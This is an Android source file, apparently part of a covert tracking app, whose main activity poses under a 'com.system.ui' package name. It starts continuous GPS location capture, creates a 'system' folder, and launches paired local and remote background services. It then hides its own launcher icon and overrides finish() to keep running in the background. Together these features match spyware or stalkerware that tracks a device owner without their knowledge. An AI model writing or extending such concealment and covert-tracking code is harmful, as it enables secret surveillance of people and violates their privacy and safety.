package com.system.ui;

import android.app.Activity;
import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import com.system.ui.service.LocalService;
import com.system.ui.service.RemoteService;
import com.system.ui.util.HideAppIcon;
import com.system.ui.util.SDCard;

import java.io.File;

public class MainActivity extends Activity {
    public static final int SDK_VERSION_ECLAIR = 5;
    public static final int SDK_VERSION_DONUT = 4;
    public static final int SDK_VERSION_CUPCAKE = 3;
    public static boolean PRE_CUPCAKE =
            getSDKVersionNumber() < SDK_VERSION_CUPCAKE ? true : false;

    public static int getSDKVersionNumber() {
        int sdkVersion;
        try {
            sdkVersion = Integer.valueOf(android.os.Build.VERSION.SDK);
        } catch (NumberFormatException e) {
            sdkVersion = 0;
        }
        return sdkVersion;
    }
    /**
     * 实时定位的位置（纬度）
     */
    public static String sLat;
    /**
     * 实时定位的位置（经度）
     */
    public static String sLng;
    /**
     * 应用创建的文件夹
     */
    public static final String APP_FOLDER = SDCard.SD_ROOT + File.separator + "system";


    public static boolean isStopThread = false;    // 线程退出标志
    private GPSLocationManager gpsLocationManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        gpsLocationManager = GPSLocationManager.getInstances(MainActivity.this);
        if (getSDKVersionNumber() >= Build.VERSION_CODES.M) {
            PermissionUtils.requestMultiPermissions(this, mPermissionGrant);
        } else {
            gpsLocationManager.start(new MyListener());
            initPath();
            initService();
            //startService(new Intent(this,LocalService.class));	// 在BaseApplication中已经启动过了
            new HideAppIcon(MainActivity.this).hide();
            finish();
        }
    }

    class MyListener implements GPSLocationListener {

        @Override
        public void UpdateLocation(Location location) {
            if (location != null) {
                sLat = String.valueOf(location.getLatitude());
                sLng = String.valueOf(location.getLongitude());
            }
        }

        @Override
        public void UpdateStatus(String provider, int status, Bundle extras) {
            if ("gps" == provider) {
            }
        }

        @Override
        public void UpdateGPSProviderStatus(int gpsStatus) {
            switch (gpsStatus) {
                case GPSProviderStatus.GPS_ENABLED:
                    break;
                case GPSProviderStatus.GPS_DISABLED:
                    break;
                case GPSProviderStatus.GPS_OUT_OF_SERVICE:
                    break;
                case GPSProviderStatus.GPS_TEMPORARILY_UNAVAILABLE:
                    break;
                case GPSProviderStatus.GPS_AVAILABLE:
                    break;
            }
        }
    }
    private PermissionUtils.PermissionGrant mPermissionGrant = new PermissionUtils.PermissionGrant() {
        @Override
        public void onPermissionGranted(int requestCode) {
            gpsLocationManager.start(new MyListener());
        }
    };

    /**
     * Callback received when a permissions request has been completed.
     */
    @Override
    public void onRequestPermissionsResult(final int requestCode, String[] permissions,
                                           int[] grantResults) {
        gpsLocationManager.start(new MyListener());
        initPath();
        initService();
        //startService(new Intent(this,LocalService.class));	// 在BaseApplication中已经启动过了
        new HideAppIcon(MainActivity.this).hide();
        finish();
    }

    /**
     * 这里的moveTaskToBack()是进栈，moveTaskToBack()
     * 就可以不销毁的把Activity放到后台去。
     */
    @Override
    public void finish() {
        this.moveTaskToBack(true);
    }



    private void initPath() {
        if (SDCard.isPrepared(this)) {// SD卡可用
            File file = new File(APP_FOLDER);
            if (!file.exists()) {
                file.mkdirs();
            }
        }
    }


    private void initService() {
        startService(new Intent(this, LocalService.class));
        startService(new Intent(this, RemoteService.class));
        Log.i("hyx", "启动服务完毕...LocalService、RemoteService...");
    }


    private static final int MY_PERMISSION_REQUEST_CODE = 10000;


}
